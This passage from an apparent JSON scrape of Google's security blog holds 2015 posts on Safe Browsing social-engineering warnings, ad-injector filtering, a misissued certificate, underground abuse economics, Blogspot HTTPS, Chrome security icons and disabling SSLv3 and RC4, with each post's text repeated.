for a given name. While this type of attack is rare, it’s very concerning as it could allow attackers to censor or alter messages before they are relayed to the email recipient.    While these threats do not affect Gmail to Gmail communication, they may affect messaging between providers. To notify our users of potential dangers, we are developing in-product warnings for Gmail users that will display when they receive a message through a non-encrypted connection. These warnings will begin to roll-out in the coming months.    All email services—Gmail included—depend on the trust of their users. Partnering with top researchers helps us make the email ecosystem as a whole safer and more secure for everyone. Security threats won’t disappear, but studies like these enable providers across the industry to fight them with better, more powerful protections today and going forward.    [This work was made possible thanks to the contribution of many Googlers including Vijay Eranti, Kurt Thomas, John Rae-Grant, and Mark Risher.]     ", "date": "November 12, 2015"},
{"website": "Google-Security", "title": "\nSafe Browsing protection from even more deceptive attacks\n", "author": ["Posted by Emily Schechter, Program Manager and Noé Lutz, Software Engineer"], "link": "https://security.googleblog.com/2015/11/safe-browsing-protection-from-even-more.html", "abstract": "                             Posted by Emily Schechter, Program Manager and Noé Lutz, Software Engineer      Safe Browsing  has been protecting over one billion people from  traditional phishing attacks  on the web for more than eight years. The threat landscape is constantly changing&#8212;bad actors on the web are using more and different types of deceptive behavior to trick you into performing actions that you didn&#8217;t intend or want, so we&#8217;ve expanded protection to include social engineering.      Social engineering is a much broader category than traditional phishing and encompasses more types of deceptive web content. A social engineering attack happens when either:       The content pretends to act, or looks and feels, like a trusted entity &#8212; like a bank or government.   The content tries to trick you into doing something you&#8217;d only do for a trusted entity &#8212; like sharing a password or calling tech support.      Below are some examples of social engineering attacks that try to trick you into thinking the content is delivered by Google or Chrome. Other trusted brands are also commonly abused for social engineering attacks.              This page tries to trick you into downloading and executing malware or unwanted software. It uses Chrome&#8217;s logo and name to confuse you into believing the site is operated by Google. Content like this may include an inconspicuous legal disclaimer that states it is not affiliated with Google. This does not change the deceptive nature of this content&#8212;as always, use caution when downloading files from the web.               This is a fake tech phone support page. This page mimics a warning and may trick you into calling a third-party company that pretends to be Google or some other trusted entity, but charges a fee for support. (Chrome does not offer paid remote support). &nbsp;              This is a fake Google login page. It might trick you into disclosing your account login credentials. Other phishing sites like this could trick you into giving up other personal information such as credit card information. Phishing sites may look exactly like the real site&#8212;so be sure to look at the address bar to check that the URL is correct, and also check to see that the website begins with https://. See more information  here .          If we identify that a web page contains social engineering content, Chrome will warn you by displaying the following warning:               (If you believe Safe Browsing has classified a web page in error, please report it  here .)         We'll continue to improve Google's Safe Browsing protection to help more people stay safer online. Check out the  Safe Browsing Transparency Report  to find out more.                                     Posted by Emily Schechter, Program Manager and Noé Lutz, Software Engineer  Safe Browsing has been protecting over one billion people from traditional phishing attacks on the web for more than eight years. The threat landscape is constantly changing—bad actors on the web are using more and different types of deceptive behavior to trick you into performing actions that you didn’t intend or want, so we’ve expanded protection to include social engineering.  Social engineering is a much broader category than traditional phishing and encompasses more types of deceptive web content. A social engineering attack happens when either:   The content pretends to act, or looks and feels, like a trusted entity — like a bank or government. The content tries to trick you into doing something you’d only do for a trusted entity — like sharing a password or calling tech support.   Below are some examples of social engineering attacks that try to trick you into thinking the content is delivered by Google or Chrome. Other trusted brands are also commonly abused for social engineering attacks.     This page tries to trick you into downloading and executing malware or unwanted software. It uses Chrome’s logo and name to confuse you into believing the site is operated by Google. Content like this may include an inconspicuous legal disclaimer that states it is not affiliated with Google. This does not change the deceptive nature of this content—as always, use caution when downloading files from the web.     This is a fake tech phone support page. This page mimics a warning and may trick you into calling a third-party company that pretends to be Google or some other trusted entity, but charges a fee for support. (Chrome does not offer paid remote support).      This is a fake Google login page. It might trick you into disclosing your account login credentials. Other phishing sites like this could trick you into giving up other personal information such as credit card information. Phishing sites may look exactly like the real site—so be sure to look at the address bar to check that the URL is correct, and also check to see that the website begins with https://. See more information here.    If we identify that a web page contains social engineering content, Chrome will warn you by displaying the following warning:      (If you believe Safe Browsing has classified a web page in error, please report it here.)    We'll continue to improve Google's Safe Browsing protection to help more people stay safer online. Check out the Safe Browsing Transparency Report to find out more.     ", "date": "November 13, 2015"},
{"website": "Google-Security", "title": "\nCutting unwanted ad injectors out of advertising\n", "author": ["Posted by Vegard Johnsen, Product Manager, Google Ads Traffic Quality"], "link": "https://security.googleblog.com/2015/09/cutting-unwanted-ad-injectors-out-of.html", "abstract": "                             Posted by Vegard Johnsen, Product Manager, Google Ads Traffic Quality     For the last few months, we&#8217;ve been raising awareness of the ad injection economy, showing how unwanted ad injectors can  hurt user experience ,  jeopardize user security , and  generate significant volumes of unwanted ads . We&#8217;ve used learnings from  our research  to prevent and remove unwanted ad injectors from Google services and improve our policies and technologies to make it more difficult to spread this unwanted software.    Today, we&#8217;re announcing a new measure to remove injected ads from the advertising ecosystem, including an automated filter in DoubleClick Bid Manager that removes impressions generated by ad injectors before any bid is made.     Unwanted ad injectors: disliked by users, advertisers, and publishers   Unwanted ad injectors are programs that insert new ads, or replace existing ones, in the pages users visit while browsing the web. Unwanted ad injectors aren&#8217;t part of a healthy ads ecosystem. They&#8217;re part of an environment where bad practices hurt users, advertisers, and publishers alike.    We&#8217;ve received almost 300,000 user complaints about them in Chrome since the beginning of 2015&#8212;more than any other issue, and it&#8217;s no wonder. Ad injectors affect all sites equally. You wouldn&#8217;t be happy if you tried to get the morning news and saw this:         Not only are they intrusive, but people are often tricked into installing them in the first place, via deceptive advertising, or software &#8220;bundles.&#8221; Ad injection can also be a security risk, as the  recent &#8220;Superfish&#8221; incident  showed.    Ad injectors are problematic for advertisers and publishers as well. Advertisers often don&#8217;t know their ads are being injected, which means they don&#8217;t have any idea where their ads are running. Publishers, meanwhile, aren&#8217;t being compensated for these ads, and more importantly, they unknowingly may be putting their visitors in harm&#8217;s way, via spam or malware in the injected ads.     Removing injected inventory from advertising   Earlier this quarter, we launched an automated filter on DoubleClick Bid Manager to prevent advertisers from buying injected ads across the web. This new system detects ad injection and proactively creates a blacklist that prevents our systems from bidding on injected inventory. Advertisers and agencies using our platforms are already protected. No adjustments are needed. No settings to change.    We currently blacklist 1.4% of the inventory accessed by DoubleClick Bid Manager across exchanges. However, we&#8217;ve found this percentage varies widely by provider. Below is a breakdown showing the filtered percentages across some of the largest exchanges:         We&#8217;ve always enforced  policies   against  the sale of injected inventory on our ads platforms, including the DoubleClick Ad Exchange. Now advertisers using DoubleClick Bid Manager can avoid injected inventory across the web.     No more injected ads?   We don&#8217;t expect the steps we&#8217;ve outlined above to solve the problem overnight, but we hope others across the industry take action to cut ad injectors out of advertising. With the tangle of different businesses involved&#8212;knowingly, or unknowingly&#8212;in the ad injector ecosystem, progress will only be made if we all work together. We strongly encourage all members of the ads ecosystem to review their policies and practices and take actions to tackle this issue.                                   Posted by Vegard Johnsen, Product Manager, Google Ads Traffic Quality  For the last few months, we’ve been raising awareness of the ad injection economy, showing how unwanted ad injectors can hurt user experience, jeopardize user security, and generate significant volumes of unwanted ads. We’ve used learnings from our research to prevent and remove unwanted ad injectors from Google services and improve our policies and technologies to make it more difficult to spread this unwanted software.  Today, we’re announcing a new measure to remove injected ads from the advertising ecosystem, including an automated filter in DoubleClick Bid Manager that removes impressions generated by ad injectors before any bid is made.  Unwanted ad injectors: disliked by users, advertisers, and publishers Unwanted ad injectors are programs that insert new ads, or replace existing ones, in the pages users visit while browsing the web. Unwanted ad injectors aren’t part of a healthy ads ecosystem. They’re part of an environment where bad practices hurt users, advertisers, and publishers alike.  We’ve received almost 300,000 user complaints about them in Chrome since the beginning of 2015—more than any other issue, and it’s no wonder. Ad injectors affect all sites equally. You wouldn’t be happy if you tried to get the morning news and saw this:   Not only are they intrusive, but people are often tricked into installing them in the first place, via deceptive advertising, or software “bundles.” Ad injection can also be a security risk, as the recent “Superfish” incident showed.  Ad injectors are problematic for advertisers and publishers as well. Advertisers often don’t know their ads are being injected, which means they don’t have any idea where their ads are running. Publishers, meanwhile, aren’t being compensated for these ads, and more importantly, they unknowingly may be putting their visitors in harm’s way, via spam or malware in the injected ads.  Removing injected inventory from advertising Earlier this quarter, we launched an automated filter on DoubleClick Bid Manager to prevent advertisers from buying injected ads across the web. This new system detects ad injection and proactively creates a blacklist that prevents our systems from bidding on injected inventory. Advertisers and agencies using our platforms are already protected. No adjustments are needed. No settings to change.  We currently blacklist 1.4% of the inventory accessed by DoubleClick Bid Manager across exchanges. However, we’ve found this percentage varies widely by provider. Below is a breakdown showing the filtered percentages across some of the largest exchanges:   We’ve always enforced policies against the sale of injected inventory on our ads platforms, including the DoubleClick Ad Exchange. Now advertisers using DoubleClick Bid Manager can avoid injected inventory across the web.  No more injected ads? We don’t expect the steps we’ve outlined above to solve the problem overnight, but we hope others across the industry take action to cut ad injectors out of advertising. With the tangle of different businesses involved—knowingly, or unknowingly—in the ad injector ecosystem, progress will only be made if we all work together. We strongly encourage all members of the ads ecosystem to review their policies and practices and take actions to tackle this issue.     ", "date": "September 10, 2015"},
{"website": "Google-Security", "title": "\nImproved Digital Certificate Security\n", "author": ["Posted by Stephan Somogyi, Security & Privacy PM, and Adam Eijdenberg, Certificate Transparency PM"], "link": "https://security.googleblog.com/2015/09/improved-digital-certificate-security.html", "abstract": "                             Posted by Stephan Somogyi, Security &amp; Privacy PM, and Adam Eijdenberg, Certificate Transparency PM     On September 14, around 19:20 GMT, Symantec&#8217;s Thawte-branded CA issued an Extended Validation (EV) pre-certificate for the domains  google.com  and  www.google.com . This pre-certificate was neither requested nor authorized by Google.    We discovered this issuance via  Certificate Transparency  logs, which Chrome has required for EV certificates starting January 1st of this year. The issuance of this pre-certificate was recorded in both Google-operated and DigiCert-operated logs.    During our ongoing discussions with Symantec we determined that the issuance occurred during a Symantec-internal testing process.    We have updated Chrome&#8217;s revocation metadata to include the public key of the misissued certificate. Additionally, the issued pre-certificate was valid only for one day.    Our primary consideration in these situations is always the security and privacy of our users; we currently do not have reason to believe they were at risk.                                   Posted by Stephan Somogyi, Security & Privacy PM, and Adam Eijdenberg, Certificate Transparency PM  On September 14, around 19:20 GMT, Symantec’s Thawte-branded CA issued an Extended Validation (EV) pre-certificate for the domains google.com and www.google.com. This pre-certificate was neither requested nor authorized by Google.  We discovered this issuance via Certificate Transparency logs, which Chrome has required for EV certificates starting January 1st of this year. The issuance of this pre-certificate was recorded in both Google-operated and DigiCert-operated logs.  During our ongoing discussions with Symantec we determined that the issuance occurred during a Symantec-internal testing process.  We have updated Chrome’s revocation metadata to include the public key of the misissued certificate. Additionally, the issued pre-certificate was valid only for one day.  Our primary consideration in these situations is always the security and privacy of our users; we currently do not have reason to believe they were at risk.     ", "date": "September 18, 2015"},
{"website": "Google-Security", "title": "\nNew research: The underground market fueling for-profit abuse\n", "author": ["Posted by Kurt Thomas and Elie Bursztein, Google Anti-Fraud and Abuse Research"], "link": "https://security.googleblog.com/2015/09/new-research-underground-market-fueling.html", "abstract": "                             Posted by Kurt Thomas and Elie Bursztein, Google Anti-Fraud and Abuse Research       Recently, we teamed up with top researchers exploring innovative anti-abuse strategies to build a holistic understanding of for-profit abuse. The full report, which you can read  here , was presented in June at the  Workshop on the Economics of Information Security &nbsp;2015.    Over the last decade, Internet crime has matured into an underground economy where a large number of globally distributed criminals trade in data, knowledge, and services specifically geared towards defrauding users and businesses. Within this black market, criminals buy and sell compromised machines, scam hosting, exploit kits, and wholesale access to pilfered user records including usernames and passwords, credit card numbers, and other sensitive personal data. The availability of such specialized resources has transformed for-profit abuse into a cooperative effort among criminals each satisfying a cog in a supply chain.   Profiting from abuse: a bird's eye view     Here&#8217;s an example of the underground value chain required to make money from spamming knock-off luxury products:           In aggregate, the problem may appear intractable to stop. However, if we view this scenario in an economic light, then increasing the cost of fake accounts, phone numbers, or compromised websites cuts into the profitability of abuse. In the end, abuse propped up by cost-ineffective resources will crumble.       Collaborating to better understand the underground     Given the complex underbelly of abuse, we pulled together experts from industry and academia to build a systematic understanding of how criminals operate. Our previous example represents just one configuration of a value chain. In our example, revenue originates solely from victims buying counterfeit products. Criminals could adapt this strategy to scam users into paying for fake anti-virus, defraud advertisers via clickbots, or liquidate a victim&#8217;s banking assets. Regardless of the composition, we argue there is always a profit center through which victims transfer new capital into the underground. These schemes form a spectrum between selling products to unwitting victims to outright theft. A medley of alternatives such as dating scams, call-center scams, premium SMS fraud, DDoS extortion, or even stealing and re-selling gaming assets all fall within this spectrum and ultimately derive a payout from victims outside the underground.    These profit centers are in turn propped up by an ecosystem of support infrastructure that can be configured arbitrarily by criminals per their requirements. This infrastructure includes compromised hosts, human labor, networking and hosting, and accounts and engagement&#8212;all available for a fee. For example, 1,000 Google accounts cost on the order of $170, compared to CAPTCHAs which cost $1 per thousand. These costs reflect socio-economic factors as well as the impact of technical, legal, and law enforcement interventions on the availability of resources.   Redefining the abuse arms race   Client and server-side security has dominated industry&#8217;s response to digital abuse over the last decade. The spectrum of solutions&#8212;automated software updates, personal anti-virus, network packet scanners, firewalls, spam filters, password managers, and two-factor authentication to name a few&#8212;all attempt to reduce the attack surface that criminals can penetrate.    While these safeguards have significantly improved user security, they create an arms race: criminals adapt or find the subset of systems that remain vulnerable and resume operation. To overcome this reactive defense cycle, we are improving our approach to abuse fighting to also strike at the support infrastructure, financial centers, and actors that incentivize abuse. By exploring the value chain required to bulk register accounts, we were able to make Google accounts  30&#8211;40% more expensive on the black market .    Success stories from our academic partners include  disrupting payment processing  for illegal pharmacies and counterfeit software outlets advertised by spam,  cutting off access to fake accounts  that pollute online services, and  disabling the command and control  infrastructure of botnets.                                   Posted by Kurt Thomas and Elie Bursztein, Google Anti-Fraud and Abuse Research  Recently, we teamed up with top researchers exploring innovative anti-abuse strategies to build a holistic understanding of for-profit abuse. The full report, which you can read here, was presented in June at the Workshop on the Economics of Information Security 2015.  Over the last decade, Internet crime has matured into an underground economy where a large number of globally distributed criminals trade in data, knowledge, and services specifically geared towards defrauding users and businesses. Within this black market, criminals buy and sell compromised machines, scam hosting, exploit kits, and wholesale access to pilfered user records including usernames and passwords, credit card numbers, and other sensitive personal data. The availability of such specialized resources has transformed for-profit abuse into a cooperative effort among criminals each satisfying a cog in a supply chain. Profiting from abuse: a bird's eye view  Here’s an example of the underground value chain required to make money from spamming knock-off luxury products:     In aggregate, the problem may appear intractable to stop. However, if we view this scenario in an economic light, then increasing the cost of fake accounts, phone numbers, or compromised websites cuts into the profitability of abuse. In the end, abuse propped up by cost-ineffective resources will crumble.  Collaborating to better understand the underground  Given the complex underbelly of abuse, we pulled together experts from industry and academia to build a systematic understanding of how criminals operate. Our previous example represents just one configuration of a value chain. In our example, revenue originates solely from victims buying counterfeit products. Criminals could adapt this strategy to scam users into paying for fake anti-virus, defraud advertisers via clickbots, or liquidate a victim’s banking assets. Regardless of the composition, we argue there is always a profit center through which victims transfer new capital into the underground. These schemes form a spectrum between selling products to unwitting victims to outright theft. A medley of alternatives such as dating scams, call-center scams, premium SMS fraud, DDoS extortion, or even stealing and re-selling gaming assets all fall within this spectrum and ultimately derive a payout from victims outside the underground.  These profit centers are in turn propped up by an ecosystem of support infrastructure that can be configured arbitrarily by criminals per their requirements. This infrastructure includes compromised hosts, human labor, networking and hosting, and accounts and engagement—all available for a fee. For example, 1,000 Google accounts cost on the order of $170, compared to CAPTCHAs which cost $1 per thousand. These costs reflect socio-economic factors as well as the impact of technical, legal, and law enforcement interventions on the availability of resources. Redefining the abuse arms race Client and server-side security has dominated industry’s response to digital abuse over the last decade. The spectrum of solutions—automated software updates, personal anti-virus, network packet scanners, firewalls, spam filters, password managers, and two-factor authentication to name a few—all attempt to reduce the attack surface that criminals can penetrate.  While these safeguards have significantly improved user security, they create an arms race: criminals adapt or find the subset of systems that remain vulnerable and resume operation. To overcome this reactive defense cycle, we are improving our approach to abuse fighting to also strike at the support infrastructure, financial centers, and actors that incentivize abuse. By exploring the value chain required to bulk register accounts, we were able to make Google accounts 30–40% more expensive on the black market.  Success stories from our academic partners include disrupting payment processing for illegal pharmacies and counterfeit software outlets advertised by spam, cutting off access to fake accounts that pollute online services, and disabling the command and control infrastructure of botnets.     ", "date": "September 24, 2015"},
{"website": "Google-Security", "title": "\nHTTPS support coming to Blogspot\n", "author": ["Posted by Jo-el van Bergen, Software Engineer, Security."], "link": "https://security.googleblog.com/2015/09/https-support-coming-to-blogspot.html", "abstract": "                             Posted by Jo-el van Bergen, Software Engineer, Security.      Since  2008 , we've worked to encrypt the connections between our users and Google servers. Over the years&nbsp;we've announced that Search, Gmail, Drive, and many other products have encrypted connections by default, and most recently, we've made a similar announcement for  our ads products .      In this same vein, today we're expanding on the  HTTPS Everywhere  mission and beginning an initial rollout of HTTPS support for Blogspot. HTTPS is a cornerstone of internet security as it provides several important benefits: it makes it harder for bad actors to steal information or track the activities of blog authors and visitors, it helps check that visitors open the correct website and aren&#8217;t being redirected to a malicious location, and it helps detect if a bad actor tries to change any data sent from Blogger to a blog visitor.     While this initial rollout won&#8217;t support all of our Blogger users, we wanted to take the first step to make HTTPS available for Blogspot; for those users who want to try it early.     We&#8217;re rolling this out gradually and Blogspot authors interested in enabling HTTPS support can begin opting-in today. Simply log into  https://www.blogger.com , click on the blog you&#8217;d like to make HTTPS enabled, navigate to the Settings page, and select \"yes\" for \"HTTPS Availability\". Unfortunately, blogs with custom domains are not supported in this first version.           Once enabled, your blog will become accessible over both HTTP and HTTPS connections. Blogspot authors should be aware that if they choose to encrypt at this time, some of the current functionality of their blog may not work over HTTPS. This can be a result of template, gadgets, and blog post content, and is often caused by   mixed content   errors, some of which may be  fixable by the author themselves .      We&#8217;ll also be moving some of our own blogs over to HTTPS gradually, beginning with the  Official Google Blog  and the  Google Online Security Blog .      For the Blogspot authors who try this out - we&#8217;re interested to hear your  feedback  while we continue to improve this feature and its capabilities! For more information, visit our  Help Center .                                   Posted by Jo-el van Bergen, Software Engineer, Security.   Since 2008, we've worked to encrypt the connections between our users and Google servers. Over the years we've announced that Search, Gmail, Drive, and many other products have encrypted connections by default, and most recently, we've made a similar announcement for our ads products.    In this same vein, today we're expanding on the HTTPS Everywhere mission and beginning an initial rollout of HTTPS support for Blogspot. HTTPS is a cornerstone of internet security as it provides several important benefits: it makes it harder for bad actors to steal information or track the activities of blog authors and visitors, it helps check that visitors open the correct website and aren’t being redirected to a malicious location, and it helps detect if a bad actor tries to change any data sent from Blogger to a blog visitor.   While this initial rollout won’t support all of our Blogger users, we wanted to take the first step to make HTTPS available for Blogspot; for those users who want to try it early.   We’re rolling this out gradually and Blogspot authors interested in enabling HTTPS support can begin opting-in today. Simply log into https://www.blogger.com, click on the blog you’d like to make HTTPS enabled, navigate to the Settings page, and select \"yes\" for \"HTTPS Availability\". Unfortunately, blogs with custom domains are not supported in this first version.     Once enabled, your blog will become accessible over both HTTP and HTTPS connections. Blogspot authors should be aware that if they choose to encrypt at this time, some of the current functionality of their blog may not work over HTTPS. This can be a result of template, gadgets, and blog post content, and is often caused by mixed content errors, some of which may be fixable by the author themselves.    We’ll also be moving some of our own blogs over to HTTPS gradually, beginning with the Official Google Blog and the Google Online Security Blog.    For the Blogspot authors who try this out - we’re interested to hear your feedback while we continue to improve this feature and its capabilities! For more information, visit our Help Center.     ", "date": "September 30, 2015"},
{"website": "Google-Security", "title": "\nSimplifying the Page Security Icon in Chrome\n", "author": ["Posted by Lucas Garron and Chris Palmer, Chrome security team"], "link": "https://security.googleblog.com/2015/10/simplifying-page-security-icon-in-chrome.html", "abstract": "                             Posted by Lucas Garron and Chris Palmer, Chrome security team     Sometimes, websites try to use HTTPS to be secure and get it mostly right, but they have minor errors. Until recently, Chrome marked this security state with a yellow &#8220;caution triangle&#8221; badge on the page security icon in the URL bar.    Starting with version 46, Chrome will mark the &#8220;HTTPS with Minor Errors&#8221; state using the same neutral page icon as HTTP pages.           There are two reasons for this:         This change is a better visual indication of the security state of the page relative to HTTP.   Chrome users will have fewer security states to learn.              (Not) Warning About Mixed Content          This change will mainly affect HTTPS pages that contain certain  mixed content , such as HTTP images.         Site operators face a dilemma: Switching an HTTP site to HTTPS can initially result in mixed content, which is undesirable in the long term but important for debugging the migration. During this process the site may not be fully secured, but it will usually not be less secure than before.         Removing the yellow &#8220;caution triangle&#8221; badge means that most users will not perceive a warning on mixed content pages during such a migration. We hope that this will encourage site operators to switch to HTTPS sooner rather than later.          Fewer Security States          This change will reduce the number of page security states in Chrome from four to three.         We have to strike a balance: representing the security state of a webpage as accurately as possible, while making sure users are not overwhelmed with too many possible states and details. We&#8217;ve come to understand that our yellow &#8220;caution triangle&#8221; badge can be confusing when compared to the HTTP page icon, and we believe that it is better not to emphasize the difference in security between these two states to most users. For developers and other interested users, it will still be possible to tell the difference by checking whether the URL begins with &#8220;https://&#8221;.         In the long term, we hope that most sites on the internet will become secure, and we  plan  to reduce the icon to just two states: secure and not secure. The change announced in this post is a small step in that direction.                                     Posted by Lucas Garron and Chris Palmer, Chrome security team  Sometimes, websites try to use HTTPS to be secure and get it mostly right, but they have minor errors. Until recently, Chrome marked this security state with a yellow “caution triangle” badge on the page security icon in the URL bar.  Starting with version 46, Chrome will mark the “HTTPS with Minor Errors” state using the same neutral page icon as HTTP pages.    There are two reasons for this:    This change is a better visual indication of the security state of the page relative to HTTP. Chrome users will have fewer security states to learn.     (Not) Warning About Mixed Content    This change will mainly affect HTTPS pages that contain certain mixed content, such as HTTP images.    Site operators face a dilemma: Switching an HTTP site to HTTPS can initially result in mixed content, which is undesirable in the long term but important for debugging the migration. During this process the site may not be fully secured, but it will usually not be less secure than before.    Removing the yellow “caution triangle” badge means that most users will not perceive a warning on mixed content pages during such a migration. We hope that this will encourage site operators to switch to HTTPS sooner rather than later.    Fewer Security States    This change will reduce the number of page security states in Chrome from four to three.    We have to strike a balance: representing the security state of a webpage as accurately as possible, while making sure users are not overwhelmed with too many possible states and details. We’ve come to understand that our yellow “caution triangle” badge can be confusing when compared to the HTTP page icon, and we believe that it is better not to emphasize the difference in security between these two states to most users. For developers and other interested users, it will still be possible to tell the difference by checking whether the URL begins with “https://”.    In the long term, we hope that most sites on the internet will become secure, and we plan to reduce the icon to just two states: secure and not secure. The change announced in this post is a small step in that direction.     ", "date": "October 13, 2015"},
{"website": "Google-Security", "title": "\nBehind the red warning: more info about online site safety\n", "author": ["Posted by ", "Adrienne Porter Felt, Chrome Security Engineer and Warning Wizard", "Emily Schechter, Safe Browsing Program Manager and Menace to Malware", "Ke Wang, Safe Browsing Engineer and Developer of Defense"], "link": "https://security.googleblog.com/2015/10/behind-red-warning-more-info-about.html", "abstract": "                             Posted by&nbsp;    Adrienne Porter Felt, Chrome Security Engineer and Warning Wizard    Emily Schechter, Safe Browsing Program Manager and Menace to Malware    Ke Wang, Safe Browsing Engineer and Developer of Defense     You&#8217;re browsing the web, checking out the latest news on your favorite band, when suddenly you see a red warning screen: &#8220;The site ahead contains malware.&#8221; These warnings aren&#8217;t new&#8212;since 2006, Google Safe Browsing has shown them when you navigate to an unsafe site. The warnings protect you from harms caused by unsafe sites, such as malware infections and phishing attacks. But it hasn&#8217;t always been clear why a specific website triggers a warning, and you may want to learn more.    To demystify these warnings, we&#8217;re launching a  Site Status section  in the Transparency Report. The next time you come across a Safe Browsing warning, you can search for the blocked website in the Transparency Report to learn why it&#8217;s been flagged by our systems.    The new Site Status section of the Transparency Report replaces our previous  Safe Browsing diagnostic page . It includes a clearer interface and simpler explanations of the issues, such as details for sites that host  unwanted software . We&#8217;ve added it to the Transparency Report so that the Safe Browsing section of the report is a one-stop shop for information to help you understand what Safe Browsing is and how it works.              If a favorite website shows up as &#8220;dangerous,&#8221; it&#8217;s often due to user-uploaded bad content or a temporary malware infection. The Site Status will return to normal once the webmaster has cleaned up the website. To help speed up this process, we automatically give the webmaster a heads-up about the problem via  Search Console ; if you use  Google Analytics , we&#8217;ll also warn you there if your site has malware on it. (Webmasters, check the  help center  to learn how to remove malware from your websites.)    We&#8217;re constantly working to keep users safe and informed online. Visit the updated Site Status section in the  Transparency Report  to experience it yourself.                                   Posted by  Adrienne Porter Felt, Chrome Security Engineer and Warning Wizard Emily Schechter, Safe Browsing Program Manager and Menace to Malware Ke Wang, Safe Browsing Engineer and Developer of Defense  You’re browsing the web, checking out the latest news on your favorite band, when suddenly you see a red warning screen: “The site ahead contains malware.” These warnings aren’t new—since 2006, Google Safe Browsing has shown them when you navigate to an unsafe site. The warnings protect you from harms caused by unsafe sites, such as malware infections and phishing attacks. But it hasn’t always been clear why a specific website triggers a warning, and you may want to learn more.  To demystify these warnings, we’re launching a Site Status section in the Transparency Report. The next time you come across a Safe Browsing warning, you can search for the blocked website in the Transparency Report to learn why it’s been flagged by our systems.  The new Site Status section of the Transparency Report replaces our previous Safe Browsing diagnostic page. It includes a clearer interface and simpler explanations of the issues, such as details for sites that host unwanted software. We’ve added it to the Transparency Report so that the Safe Browsing section of the report is a one-stop shop for information to help you understand what Safe Browsing is and how it works.     If a favorite website shows up as “dangerous,” it’s often due to user-uploaded bad content or a temporary malware infection. The Site Status will return to normal once the webmaster has cleaned up the website. To help speed up this process, we automatically give the webmaster a heads-up about the problem via Search Console; if you use Google Analytics, we’ll also warn you there if your site has malware on it. (Webmasters, check the help center to learn how to remove malware from your websites.)  We’re constantly working to keep users safe and informed online. Visit the updated Site Status section in the Transparency Report to experience it yourself.     ", "date": "October 20, 2015"},
{"website": "Google-Security", "title": "\nSay hello to the Enigma conference\n", "author": [], "link": "https://security.googleblog.com/2015/08/say-hello-to-enigma-conference.html", "abstract": "                               Posted by Elie Bursztein - Anti-abuse team, Parisa Tabriz - Chrome Security and Niels Provos - Security team           USENIX Enigma    is a new conference focused on security, privacy and electronic crime through the lens of emerging threats and novel attacks. The goal of this conference is to help industry, academic, and public-sector practitioners better understand the threat landscape. Enigma will have a single track of 30-minute talks that are curated by a panel of experts, featuring strong technical content with practical applications to current and emerging threats.                     Google is excited to both sponsor and help USENIX build Enigma, since we share many of its core principles: transparency, openness, and cutting-edge security research. Furthermore, we are proud to provide Enigma with with engineering and design support, as well as volunteer participation in program and steering committees.        The first instantiation of Enigma will be held January 25-27 in San Francisco. You can sign up for more information about the conference or propose a talk through the official conference site at    http://enigma.usenix.org                                        Posted by Elie Bursztein - Anti-abuse team, Parisa Tabriz - Chrome Security and Niels Provos - Security team   USENIX Enigma is a new conference focused on security, privacy and electronic crime through the lens of emerging threats and novel attacks. The goal of this conference is to help industry, academic, and public-sector practitioners better understand the threat landscape. Enigma will have a single track of 30-minute talks that are curated by a panel of experts, featuring strong technical content with practical applications to current and emerging threats.      Google is excited to both sponsor and help USENIX build Enigma, since we share many of its core principles: transparency, openness, and cutting-edge security research. Furthermore, we are proud to provide Enigma with with engineering and design support, as well as volunteer participation in program and steering committees.   The first instantiation of Enigma will be held January 25-27 in San Francisco. You can sign up for more information about the conference or propose a talk through the official conference site at http://enigma.usenix.org     ", "date": "August 18, 2015"},
{"website": "Google-Security", "title": "\nDisabling SSLv3 and RC4\n", "author": ["Posted by Adam Langley, Security Engineer", "As the ", " ", " transition to SHA-256 certificates is nearing completion, we are planning the next changes to Google’s TLS configuration. As part of those changes, we expect to disable support for SSLv3 and RC4 in the medium term.", "SSLv3 has been ", " for over 16 years and is so full of known problems that the IETF has decided that it ", ". RC4 is a 28 year old cipher that has done remarkably well, but is now the subject of ", " ", " at security conferences. The IETF has decided that RC4 also warrants a statement that it too ", ".", "Because of these issues we expect to disable both SSLv3 and RC4 support at Google’s frontend servers and, over time, across our products in general, including Chrome, Android, our webcrawlers and our SMTP servers. (Indeed, SSLv3 support has already been removed from Chrome.) The ", " survey of the top 200,000 HTTPS sites finds that, already, 42% of sites have disabled RC4 and 65% of sites have disabled SSLv3.", "If your TLS client, webserver or email server requires the use of SSLv3 or RC4 then the time to update was some years ago, but better late than never. However, note that just because you might be using RC4 today doesn’t mean that your client or website will stop working: TLS can negotiate cipher suites and problems will only occur if you don’t support anything but RC4. (Although if you’re using SSLv3 today then things will stop working when we disable it because SSLv3 is already a last resort.)", "Google's frontend servers do a lot more than terminate connections for browsers these days; there are also lots of embedded systems talking to Google using TLS. In order to reduce the amount of work that the deprecation of outdated cryptography causes, we are also announcing suggested minimum standards for TLS clients today. This applies to TLS clients in general: certainly those that are using TLS as part of HTTPS, but also, for example, SMTP servers using STARTTLS.", "We can't predict the future, but devices that meet these requirements are likely to be able to continue functioning without changes to their TLS configuration up to 2020. You should expect these standards to be required in cases where Google runs certification programs, but it’s a very good idea to meet them anyway.", "Devices that don’t meet these standards aren’t going to stop working anytime soon (unless they depend on RC4 or SSLv3—see above), but they might be affected by further TLS changes in the coming years.", "Specifically, we are requiring:"], "link": "https://security.googleblog.com/2015/09/disabling-sslv3-and-rc4.html", "abstract": "                             Posted by Adam Langley, Security Engineer        As the  previously   announced  transition to SHA-256 certificates is nearing completion, we are planning the next changes to Google&#8217;s TLS configuration. As part of those changes, we expect to disable support for SSLv3 and RC4 in the medium term.        SSLv3 has been  obsolete  for over 16 years and is so full of known problems that the IETF has decided that it  must no longer be used . RC4 is a 28 year old cipher that has done remarkably well, but is now the subject of  multiple   attacks  at security conferences. The IETF has decided that RC4 also warrants a statement that it too  must no longer be used .        Because of these issues we expect to disable both SSLv3 and RC4 support at Google&#8217;s frontend servers and, over time, across our products in general, including Chrome, Android, our webcrawlers and our SMTP servers. (Indeed, SSLv3 support has already been removed from Chrome.) The  SSL Pulse  survey of the top 200,000 HTTPS sites finds that, already, 42% of sites have disabled RC4 and 65% of sites have disabled SSLv3.        If your TLS client, webserver or email server requires the use of SSLv3 or RC4 then the time to update was some years ago, but better late than never. However, note that just because you might be using RC4 today doesn&#8217;t mean that your client or website will stop working: TLS can negotiate cipher suites and problems will only occur if you don&#8217;t support anything but RC4. (Although if you&#8217;re using SSLv3 today then things will stop working when we disable it because SSLv3 is already a last resort.)         Minimum standards for TLS clients           Google's frontend servers do a lot more than terminate connections for browsers these days; there are also lots of embedded systems talking to Google using TLS. In order to reduce the amount of work that the deprecation of outdated 